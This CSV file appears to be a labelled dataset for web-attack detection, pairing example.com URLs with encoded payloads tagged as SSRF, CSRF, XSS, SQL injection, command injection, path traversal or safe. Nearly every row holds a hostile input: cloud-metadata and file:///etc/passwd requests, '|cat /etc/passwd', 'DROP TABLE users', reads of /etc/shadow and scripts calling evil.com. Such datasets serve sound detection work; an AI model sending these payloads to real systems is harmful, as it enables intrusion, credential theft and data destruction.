URL,Attack_Type,Payload_Description
https://example.com/?path=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
https://example.com/?user=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?search=apple,NONE,Safe input
https://example.com/?id=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
https://example.com/?path=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
https://example.com/?search=%3Bls,Command Injection,Command Injection payload: ;ls
https://example.com/?file=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?q=%26%26whoami,Command Injection,Command Injection payload: &&whoami
https://example.com/?id=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?q=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?user=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
https://example.com/?redirect=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?id=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
https://example.com/?input=banana,NONE,Safe input
https://example.com/?cmd=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
https://example.com/?id=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
https://example.com/?file=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
https://example.com/?file=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
https://example.com/?content=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?input=user123,NONE,Safe input
https://example.com/?content=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
https://example.com/?redirect=logout%3Dtrue,NONE,Safe input
https://example.com/?search=%3Bls,Command Injection,Command Injection payload: ;ls
https://example.com/?redirect=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?content=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
https://example.com/?q=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
https://example.com/?file=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
https://example.com/?cmd=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?url=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?input=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?url=%3Bls,Command Injection,Command Injection payload: ;ls
https://example.com/?q=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
https://example.com/?path=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
https://example.com/?cmd=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
https://example.com/?file=%3Bls,Command Injection,Command Injection payload: ;ls
https://example.com/?input=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?content=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
https://example.com/?q=about-us,NONE,Safe input
https://example.com/?cmd=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
https://example.com/?q=%26%26whoami,Command Injection,Command Injection payload: &&whoami
https://example.com/?data=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?content=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?input=about-us,NONE,Safe input
https://example.com/?id=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?data=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?cmd=page%3Dhome,NONE,Safe input
https://example.com/?content=user123,NONE,Safe input
https://example.com/?url=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
https://example.com/?id=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
https://example.com/?search=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
https://example.com/?path=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?token=feedback,NONE,Safe input
https://example.com/?redirect=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
https://example.com/?url=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
https://example.com/?redirect=logout%3Dtrue,NONE,Safe input
https://example.com/?q=page%3Dhome,NONE,Safe input
https://example.com/?content=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
https://example.com/?search=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
https://example.com/?path=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
https://example.com/?search=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
https://example.com/?token=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
https://example.com/?input=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
https://example.com/?content=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
https://example.com/?content=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
https://example.com/?id=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?q=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
https://example.com/?search=banana,NONE,Safe input
https://example.com/?search=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?path=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
https://example.com/?search=%3Bls,Command Injection,Command Injection payload: ;ls
https://example.com/?input=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
https://example.com/?file=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
https://example.com/?input=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
https://example.com/?cmd=page%3Dhome,NONE,Safe input
https://example.com/?q=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
https://example.com/?input=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
https://example.com/?content=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?input=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
https://example.com/?url=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?content=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?input=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
https://example.com/?id=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
https://example.com/?url=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?path=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?path=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?content=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?search=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
https://example.com/?redirect=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
https://example.com/?user=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
https://example.com/?search=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
https://example.com/?user=%3Bls,Command Injection,Command Injection payload: ;ls
https://example.com/?token=page%3Dhome,NONE,Safe input
https://example.com/?id=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
https://example.com/?content=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
https://example.com/?search=banana,NONE,Safe input
https://example.com/?content=search%3Dproducts,NONE,Safe input
https://example.com/?id=query%3Dhelp,NONE,Safe input
https://example.com/?content=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
https://example.com/?url=user123,NONE,Safe input
https://example.com/?input=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
https://example.com/?url=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
https://example.com/?token=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?q=%26%26whoami,Command Injection,Command Injection payload: &&whoami
https://example.com/?token=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?content=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
https://example.com/?path=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
https://example.com/?url=%26%26whoami,Command Injection,Command Injection payload: &&whoami
https://example.com/?path=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?data=page%3Dhome,NONE,Safe input
https://example.com/?user=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
https://example.com/?file=category%3Dbooks,NONE,Safe input
https://example.com/?url=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
https://example.com/?redirect=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
https://example.com/?data=filter%3Dpopular,NONE,Safe input
https://example.com/?content=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
https://example.com/?content=%3Bls,Command Injection,Command Injection payload: ;ls
https://example.com/?path=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?file=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?path=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?id=apple,NONE,Safe input
https://example.com/?path=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
https://example.com/?file=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
https://example.com/?id=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?user=%3Bls,Command Injection,Command Injection payload: ;ls
https://example.com/?q=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?path=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
https://example.com/?id=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
https://example.com/?q=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
https://example.com/?token=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
https://example.com/?search=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
https://example.com/?redirect=id%3D567,NONE,Safe input
https://example.com/?user=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
https://example.com/?content=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?search=category%3Dbooks,NONE,Safe input
https://example.com/?file=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?redirect=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
https://example.com/?user=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
https://example.com/?search=hello,NONE,Safe input
https://example.com/?id=logout%3Dtrue,NONE,Safe input
https://example.com/?search=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?redirect=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?data=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
https://example.com/?url=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
https://example.com/?input=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
https://example.com/?redirect=%3Bls,Command Injection,Command Injection payload: ;ls
https://example.com/?data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
https://example.com/?search=apple,NONE,Safe input
https://example.com/?path=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
https://example.com/?token=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
https://example.com/?search=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
https://example.com/?url=logout%3Dtrue,NONE,Safe input
https://example.com/?data=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?data=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
https://example.com/?user=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
https://example.com/?id=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
https://example.com/?url=%26%26whoami,Command Injection,Command Injection payload: &&whoami
https://example.com/?user=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
https://example.com/?data=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
https://example.com/?id=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?q=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?cmd=banana,NONE,Safe input
https://example.com/?content=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?q=lang%3Den,NONE,Safe input
https://example.com/?url=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
https://example.com/?cmd=search%3Dproducts,NONE,Safe input
https://example.com/?id=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
https://example.com/?data=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?token=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
https://example.com/?file=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?data=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
https://example.com/?redirect=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
https://example.com/?path=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
https://example.com/?cmd=%3Bls,Command Injection,Command Injection payload: ;ls
https://example.com/?file=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
https://example.com/?token=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
https://example.com/?id=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
https://example.com/?data=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
https://example.com/?cmd=category%3Dbooks,NONE,Safe input
https://example.com/?redirect=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?url=page%3Dhome,NONE,Safe input
https://example.com/?user=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
https://example.com/?data=%3Bls,Command Injection,Command Injection payload: ;ls
https://example.com/?path=1%27%3B%20DROP%20TABLE%20users%20--,SQL Injection,SQL Injection payload: 1'; DROP TABLE users --
https://example.com/?search=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?id=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
https://example.com/?redirect=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?file=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?file=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
https://example.com/?user=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
https://example.com/?file=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?q=user123,NONE,Safe input
https://example.com/?content=apple,NONE,Safe input
https://example.com/?user=%26%26whoami,Command Injection,Command Injection payload: &&whoami
https://example.com/?url=about-us,NONE,Safe input
https://example.com/?cmd=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?data=1%27%20OR%20%271%27%3D%271,SQL Injection,SQL Injection payload: 1' OR '1'='1
https://example.com/?url=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?data=about-us,NONE,Safe input
https://example.com/?id=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?token=banana,NONE,Safe input
https://example.com/?content=%3Bls,Command Injection,Command Injection payload: ;ls
https://example.com/?path=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,XSS,"XSS payload: ""><img src=x onerror=alert(1)>"
https://example.com/?id=%3Bls,Command Injection,Command Injection payload: ;ls
https://example.com/?user=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?cmd=..%2F..%2Fetc%2Fshadow,Path Traversal,Path Traversal payload: ../../etc/shadow
https://example.com/?content=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?input=filter%3Dpopular,NONE,Safe input
https://example.com/?user=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?q=%3Cform%20action%3D%27http%3A%2F%2Fevil.com%27%3E%3Cinput%20type%3D%27submit%27%3E%3C%2Fform%3E,CSRF,CSRF payload: <form action='http://evil.com'><input type='submit'></form>
https://example.com/?cmd=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?q=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
https://example.com/?data=%7Ccat%20%2Fetc%2Fpasswd,Command Injection,Command Injection payload: |cat /etc/passwd
https://example.com/?url=category%3Dbooks,NONE,Safe input
https://example.com/?path=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
https://example.com/?file=%3Cscript%3Efetch%28%27http%3A%2F%2Fevil.com%27%29%3C%2Fscript%3E,CSRF,CSRF payload: <script>fetch('http://evil.com')</script>
https://example.com/?search=filter%3Dpopular,NONE,Safe input
https://example.com/?token=http%3A%2F%2F127.0.0.1,SSRF,SSRF payload: http://127.0.0.1
https://example.com/?user=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
https://example.com/?cmd=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,SSRF,SSRF payload: http://169.254.169.254/latest/meta-data/
https://example.com/?id=category%3Dbooks,NONE,Safe input
https://example.com/?file=banana,NONE,Safe input
https://example.com/?content=admin%27%20--,SQL Injection,SQL Injection payload: admin' --
https://example.com/?cmd=javascript%3Aalert%28%27XSS%27%29,XSS,XSS payload: javascript:alert('XSS')
https://example.com/?url=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?user=file%3A%2F%2F%2Fetc%2Fpasswd,SSRF,SSRF payload: file:///etc/passwd
https://example.com/?cmd=%3Bls,Command Injection,Command Injection payload: ;ls
https://example.com/?file=%3Csvg%20onload%3Dalert%281%29%3E,XSS,XSS payload: <svg onload=alert(1)>
https://example.com/?file=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,XSS,XSS payload: <script>alert('XSS')</script>
https://example.com/?cmd=..%2F..%2F%2Fvar%2Flog,Path Traversal,Path Traversal payload: ../..//var/log
https://example.com/?content=..%2F..%2Fetc%2Fpasswd,Path Traversal,Path Traversal payload: ../../etc/passwd
